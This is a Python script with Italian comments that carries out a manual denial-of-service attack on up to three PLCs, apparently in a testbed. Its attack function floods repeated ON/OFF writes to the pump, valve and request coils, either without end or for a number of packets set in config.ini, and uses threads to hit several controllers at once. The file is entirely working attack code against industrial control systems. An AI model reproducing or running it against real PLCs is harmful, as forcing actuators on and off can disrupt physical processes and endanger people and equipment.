import configparser
import threading

def attack(ctx):
    """
    Questa classe è dedicata a settare i parametri al fine di configurare l'attacco DoS Manuale sulle
    plc inserite (tutti i parametri sono estratti dal file 'config.ini).
    """
    
    def on_status_mode():
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')                
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        if(bool_loop == "loop" ):
            while True:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR_loop")
                    exit()
                counter += 1
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR")
                    exit()
                counter += 1
            exit()
            
    def on_status_mode2(): 
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')                
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        if(bool_loop == "loop" ):
            while True:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write(int(comandoSpedito))
                    coil_register_pump2.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write(int(comandoSpedito))
                    coil_register_valve2.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write(int(comandoSpedito))
                    coil_register_req2.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR_loop")
                    exit()
                counter += 1
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write(int(comandoSpedito))
                    coil_register_pump2.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write(int(comandoSpedito))
                    coil_register_valve2.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write(int(comandoSpedito))
                    coil_register_req2.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR")
                    exit()
                counter += 1
            exit()

    def on_status_mode3(): 
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')                
        
        #BRANCH A NUMERO DI PACCHETTI ILLIMITATO
        if(bool_loop == "loop" ):
            while True:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write(int(comandoSpedito))
                    coil_register_pump2.write(int(comandoSpedito))
                    coil_register_pump3.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write(int(comandoSpedito))
                    coil_register_valve2.write(int(comandoSpedito))
                    coil_register_valve3.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write(int(comandoSpedito))
                    coil_register_req2.write(int(comandoSpedito))
                    coil_register_req3.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR_loop")
                    exit()
                counter += 1
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                if  int(config.get('params', 'coil1')) == 1:
                    coil_register_pump.write (int(comandoSpedito))
                    coil_register_pump2.write(int(comandoSpedito))
                    coil_register_pump3.write(int(comandoSpedito))
                elif int(config.get('params', 'coil2')) == 1:
                    coil_register_valve.write (int(comandoSpedito))
                    coil_register_valve2.write(int(comandoSpedito))
                    coil_register_valve3.write(int(comandoSpedito))
                elif int(config.get('params', 'coil3')) == 1:
                    coil_register_req.write (int(comandoSpedito))
                    coil_register_req2.write(int(comandoSpedito))
                    coil_register_req3.write(int(comandoSpedito))
                print("Pacchetto n°: " + str(counter))
                if comandoSpedito == 1:
                    print("Contenuto del pacchetto: comando ON")
                elif comandoSpedito == 0:
                    print("Contenuto del pacchetto: comando OFF")
                else:
                    print("ERROR")
                    exit()
                counter += 1
            exit()

    def start_polling1():
        input_register1.start_polling(500, on_status_mode())

    def start_polling2():
        input_register2.start_polling(500, on_status_mode2())
        
    def start_polling3():
        input_register3.start_polling(500, on_status_mode3())

    config = configparser.ConfigParser()
    config.read('config.ini')
    comandoSpedito = int(config.get('params', 'value_of_package'))

    input_register1     = ctx.register('plc1', 'I', 0)      #Leggo il valore di %IW0 (level)
    coil_register_pump  = ctx.register('plc1', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve = ctx.register('plc1', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req   = ctx.register('plc1', 'C', 2)  #Equivale a  %QX0.2 (request)

    input_register2      = ctx.register('plc2', 'I', 0)      #Leggo il valore di %IW0 (level)
    coil_register_pump2  = ctx.register('plc2', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve2 = ctx.register('plc2', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req2   = ctx.register('plc2', 'C', 2)  #Equivale a  %QX0.2 (request)

    input_register3      = ctx.register('plc3', 'I', 0)      #Leggo il valore di %IW0 (level)
    coil_register_pump3  = ctx.register('plc3', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve3 = ctx.register('plc3', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req3   = ctx.register('plc3', 'C', 2)  #Equivale a  %QX0.2 (request)


    #ATTACCO UNA SOLA PLC (la prima della lista)
    if config.get('plc', 'plc1') == config.get('plc', 'plc2') and config.get('plc', 'plc2') == config.get('plc', 'plc3'):
        print("Attacco ad una plc!")
        input_register1.start_polling(500, on_status_mode())
###############################################################################################################

    #ATTACCO IN CONTEMPORANEA SU DUE PLC
    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc3') == config.get('plc', 'plc1') and config.get('plc', 'plc1') != config.get('plc', 'plc2'):
        print("Attacco a due plc in contemporanea!")

        # Crea i thread per eseguire le due funzioni
        thread1 = threading.Thread(target=start_polling1)
        thread2 = threading.Thread(target=start_polling2)

        # Avvia i thread
        thread1.start()
        thread2.start()

        # Attendere che i thread completino l'esecuzione
        thread1.join()
        thread2.join()
        #input_register1.start_polling(500, on_status_mode2())
###############################################################################################################

    #ATTACCO IN CONTEMPORANEA SU TRE PLC
    if config.get('plc', 'plc1') != config.get('plc', 'plc2') and config.get('plc', 'plc2') != config.get('plc', 'plc3'):
        print("Attacco a tre plc in contemporanea!")

        # Crea i thread per eseguire le due funzioni
        thread1 = threading.Thread(target=start_polling1)
        thread2 = threading.Thread(target=start_polling2)
        thread3 = threading.Thread(target=start_polling3)

        # Avvia i thread
        thread1.start()
        thread2.start()
        thread3.start()

        # Attendere che i thread completino l'esecuzione
        thread1.join()
        thread2.join()
        thread3.join()
###############################################################################################################

